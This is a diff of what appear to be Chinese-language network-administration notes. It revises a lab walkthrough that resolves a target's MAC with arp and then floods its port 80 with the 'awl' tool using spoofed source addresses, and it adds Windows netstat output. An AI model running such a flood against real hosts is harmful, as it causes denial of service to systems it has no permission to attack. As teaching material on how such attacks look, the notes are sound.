@@ -315,15 +315,38 @@ traceroute to naver.com (125.209.222.141), 30 hops max, 60 byte packets
   - p 被攻击机器的端口
 - 开始攻击
   ```
-  [root@localhost63 ~]# ping 192.168.1.64
+  [root@localhost ~]# ping 192.168.1.64
 
-  [root@localhost63 ~]# arp -n     #   获取对方的IP地址解析成MAC地址
+  [root@localhost ~]# arp -n     #   获取对方的IP地址解析成MAC地址
   Address                  HWtype  HWaddress           Flags Mask            Iface
-  192.168.1.17             ether   e0:b9:a5:ac:c5:76        C                     eth0
-  192.168.1.64             ether   00:0c:29:57:f5:b5        C                     eth0
-  
-  [root@localhost63 ~]# awl -i ens33 -m 00:0c:29:57:f5:b5 -d 192.168.1.64 -p 80
-  
-  [root@localhost64 ~]# netstat -anutp | grep 80        #   在localhost64上查看：发现很多伪装成公网的IP在攻击
+  192.168.0.219            ether   bc:85:56:bb:8f:03   C                     ens33
+  192.168.0.1              ether   90:6c:ac:b3:0b:c4   C                     ens33
 
+  
+  [root@localhost ~]# awl -i ens33 -m bc:85:56:bb:8f:03 -d 192.168.0.219 -p 80
+  
+  [root@localhost64 ~]# netstat -anutp | grep 80        # 在localhost64上查看：发现很多伪装成公网的IP在攻击
+  C:\Users\xerox>netstat                                # windows
+
+  활성 연결
+
+    프로토콜  로컬 주소           외부 주소              상태
+    TCP    127.0.0.1:1641         DESKTOP-7ET6EKR:5939   ESTABLISHED
+    TCP    127.0.0.1:1838         DESKTOP-7ET6EKR:1839   ESTABLISHED
+    TCP    127.0.0.1:1839         DESKTOP-7ET6EKR:1838   ESTABLISHED
+    TCP    127.0.0.1:1882         DESKTOP-7ET6EKR:1883   ESTABLISHED
+    TCP    127.0.0.1:1883         DESKTOP-7ET6EKR:1882   ESTABLISHED
+    TCP    127.0.0.1:5939         DESKTOP-7ET6EKR:1641   ESTABLISHED
+    TCP    192.168.0.219:445      KORSD09F2JPBXE:53002   ESTABLISHED
+    TCP    192.168.0.219:1796     113.96.208.198:8080    ESTABLISHED
+    TCP    192.168.0.219:1799     183.232.103.146:8080   ESTABLISHED
+    TCP    192.168.0.219:1837     213.227.170.135:https  ESTABLISHED
+    TCP    192.168.0.219:1849     52.230.3.194:https     ESTABLISHED
+    TCP    192.168.0.219:4468     203.205.146.16:http    ESTABLISHED
+    TCP    192.168.0.219:4622     221.228.75.150:9203    ESTABLISHED
+    TCP    192.168.0.219:4737     192.168.0.162:ssh      ESTABLISHED
+    TCP    192.168.0.219:4981     203.205.151.45:https   CLOSE_WAIT
+    TCP    192.168.0.219:5302     203.205.219.54:http    CLOSE_WAIT
+    TCP    192.168.0.219:5514     161.202.224.155:8080   CLOSE_WAIT
+    TCP    192.168.0.219:5517     203.205.158.52:http    CLOSE_WAIT
   ```
